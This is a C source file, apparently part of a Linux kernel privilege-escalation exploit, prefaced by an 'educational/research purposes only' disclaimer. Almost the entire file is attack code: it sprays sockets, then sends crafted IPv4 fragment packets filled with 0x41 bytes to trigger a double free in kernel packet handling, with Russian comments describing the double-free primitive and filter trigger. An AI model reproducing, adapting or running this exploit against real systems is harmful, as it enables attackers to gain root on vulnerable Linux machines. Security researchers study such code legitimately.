// This program, and the other programs and scripts ("programs", "these programs") in this software directory/folder/repository ("repository") are published, developed and distributed for educational/research purposes only. I ("the creator") do not condone any malicious or illegal usage of these programs, as the intend is sharing research and not doing illegal activities with it. I am not legally responsible for anything you do with these programs.

#define _GNU_SOURCE 1
#include <sched.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <string.h>
#include <fcntl.h>
#include <sys/xattr.h>
#include <errno.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

#include "env.h"
#include "net.h"
#include "nftnl.h"
#include "config.h"


static char intermed_buf[1 << 19];

static void send_ipv4_ip_hdr_chr(size_t dfsize, struct ip *ip_header, char chr)
{
	memset(intermed_buf, chr, dfsize);
	send_ipv4_ip_hdr(intermed_buf, dfsize, ip_header);
}
// пакет с нагрузкой под double free, как раз содержит \x41, тригер на который мы ставили в фильтре
static void trigger_double_free_hdr(size_t dfsize, struct ip *ip_header)
{
	printf("[*] sending double free buffer packet...\n");
	send_ipv4_ip_hdr_chr(dfsize, ip_header, '\x41');
}

static void alloc_intermed_buf_hdr(size_t dfsize, struct ip *ip_header)
{
	PRINTF_VERBOSE("[*] sending intermediate buffer packet...\n");
	send_ipv4_ip_hdr_chr(dfsize, ip_header, '\x00');
}



static void privesc_flh_bypass_no_time()
{
	struct ip df_ip_header = {
		.ip_v = 4,
		.ip_hl = 5,
		.ip_tos = 0,
		.ip_len = 0xDEAD,
		.ip_id = 0xDEAD, 
		.ip_off = 0xDEAD,
		.ip_ttl = 128,
		.ip_p = 70,
		.ip_src.s_addr = inet_addr("1.1.1.1"),
		.ip_dst.s_addr = inet_addr("255.255.255.255"),
	};

	populate_sockets();


	// cause socket/networking-related objects to be allocated
	df_ip_header.ip_id = 0x1336;
	df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 8 + 4000;
	df_ip_header.ip_off = ntohs((8 >> 3) | 0x2000);
	alloc_intermed_buf_hdr(32768 + 8, &df_ip_header);


	printf("[*] waiting for the calm before the storm...\n");
	sleep(CONFIG_SEC_BEFORE_STORM);

	// allocate and free 1 skb from freelist
	df_ip_header.ip_id = 0x1337;
	df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 24;
	df_ip_header.ip_off = ntohs((0 >> 3) | 0x2000);  // wait for other fragments. 8 >> 3 to make it wait or so?
	trigger_double_free_hdr(32768 + 8, &df_ip_header);
}

int main()
{
		// вот эта часть создает примитив для двойного освобождения
		setup_env();
 
		privesc_flh_bypass_no_time();

		// prevent crashes due to invalid pagetables
		sleep(9999);

	return 0;
}